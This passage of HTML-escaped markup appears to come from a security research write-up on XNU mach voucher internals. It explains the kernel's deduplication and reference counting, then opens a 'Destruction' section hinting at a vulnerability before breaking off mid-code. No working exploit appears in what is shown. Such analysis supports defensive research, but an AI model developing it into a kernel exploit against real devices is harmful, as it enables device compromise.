class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_persist &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;flag &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;MACH_VOUCHER_ATTR_VALUE_FLAGS_PERSIST&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;?&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;TRUE &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* insert the new entry in the proper hash chain */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_next &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;hash_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;].&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;hash_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;].&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* donated passed in ivac reference to new entry */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;You&amp;#39;ll notice that this code has a very similar structure to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_dedup&lt;/span&gt;&lt;span&gt;; it needs to do almost exactly the same thing. Under a lock (this time the controller&amp;#39;s lock) traverse a hash table looking for a matching value. If one can&amp;#39;t be found, allocate a new entry and put the value in the hash table. The same unlock/lock dance is needed, but not every time because &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span&gt;&amp;#39;s are kept in a table of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;struct ivac_entry_s&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;#39;s so the lock only needs to be dropped if the table needs to grow.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;If a new entry is allocated (from the freelist of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;#39;s in the table) then its reference count (&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;) is set to 1, and its &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;count is set to 1. If an existing entry is found then both its &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;counts are incremented:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.5d6f231d91c5f3fcaedc02e8af1faacf22268e6f\"&gt;&lt;/a&gt;&lt;a id=\"t.33\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Finally, the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c17\"&gt;index&lt;/span&gt;&lt;span&gt;&amp;nbsp;of this entry in the table of all the controller&amp;#39;s entries is returned, because it&amp;#39;s the index into that table which a voucher stores; not a pointer to the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_reference_by_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;then calls &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_set&lt;/span&gt;&lt;span&gt;&amp;nbsp;to store that index into the correct slot in the voucher&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;, which is just a simple array index operation:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.ac2c12e184f7c3e12da13fbd6404f62d8c16842e\"&gt;&lt;/a&gt;&lt;a id=\"t.34\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_set&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;val_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.49ce745eb25ac89c231f0c471abc9f82f9797477\"&gt;&lt;/a&gt;&lt;a id=\"t.35\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;void&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_set&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ipc_voucher_t iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; iv_index_t key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; iv_index_t value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Our journey following this recipe is almost over! Since we only supplied one sub-recipe we exit the loop in &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;and reach the call to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dedup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.bdeacdf6e0a60502a972f38307eadc992aacd7de\"&gt;&lt;/a&gt;&lt;a id=\"t.36\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_dedup&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;I won&amp;#39;t show the code for &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dedup&lt;/span&gt;&lt;span&gt;&amp;nbsp;here because it&amp;#39;s again structurally almost identical to the two other levels of deduping we&amp;#39;ve examined. In fact it&amp;#39;s a little simpler because it can hold the associated hash table lock the whole time (via &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivht_lock()&lt;/span&gt;&lt;span&gt;) since it doesn&amp;#39;t need to allocate anything. If a match is found (that is, the hash table already contains a voucher with exactly the same set of value indexes) then a reference is taken on that existing voucher and a reference is dropped on the voucher we just created from the input recipe via &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_dealloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.1101ce1325bc496de996015edaf1a773d5d5120c\"&gt;&lt;/a&gt;&lt;a id=\"t.37\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;iv_dealloc&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_iv&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;FALSE&lt;/span&gt;&lt;span&gt;&amp;nbsp;argument here indicates that &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;new_iv&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t in the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivht_bucket&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;hashtable so shouldn&amp;#39;t be removed from there if it is going to be destroyed. Vouchers are only added to the hashtable after the deduping process to prevent deduplication happening against incomplete vouchers.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;The final step occurs when &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;returns. Since this is a MIG method, if it returns success and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;new_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;isn&amp;#39;t &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;IV_NULL&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;new_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;will be converted into a mach port; a send right to which will be given to the userspace caller. This is the final level of deduplication; there can only ever be one mach port representing a particular voucher. This is implemented by the voucher structure&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_port&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;member.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;(For the sake of completeness note that there are actually two userspace interfaces to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;; the host port MIG method and also the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;host_create_mach_voucher_trap&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;mach trap. The trap interface has to emulate the MIG semantics though.)&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"BGLtzooHlW-c18 BGLtzooHlW-c5\" id=\"h.gt3jam2tl3zw\"&gt;&lt;span&gt;Destruction&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Although I did briefly hint at a vulnerability above we still haven&amp;#39;t actually seen enough code to determine that that bug actually has any security consequences. This is where things get complicated ;-)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;Let&amp;#39;s start with the result of the situation we described above, where we created a voucher port with the following recipe:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.a9632b719aa64a5ca7f22f3e9944b5fd0708e9e6\"&gt;&lt;/a&gt;&lt;a id=\"t.38\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;udata_dword_recipe &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; mach_voucher_attr_recipe_data_t recipe&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; uint32_t payload&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;struct&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;udata_dword_recipe r &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;};&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;r&lt;/span&gt;&lt;span 